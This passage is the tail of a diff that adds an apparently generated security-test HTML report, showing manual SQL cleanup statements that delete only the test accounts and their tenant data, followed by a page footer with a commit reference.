+  DELETE FROM user_identities       WHERE email LIKE &#39;sectest-%@example.invalid&#39;;
+  DELETE FROM users                 WHERE email LIKE &#39;sectest-%@example.invalid&#39;;
+\&quot;&quot;
+</code></pre>
+<p>(Run this manually after reviewing the report — it deletes the two test users + their tenants + everything tenant-scoped under them.)</p>
+
+</main>
+<footer class="page">
+  <span>Generated 2026-05-27 13:47:33 UTC · commit cff74b2</span>
+  <span>Source: <a href="https://github.com/dajmlj812/SmrtCa-h">github.com/dajmlj812/SmrtCa-h</a></span>
+</footer>
+</div>
+</body>
+</html>
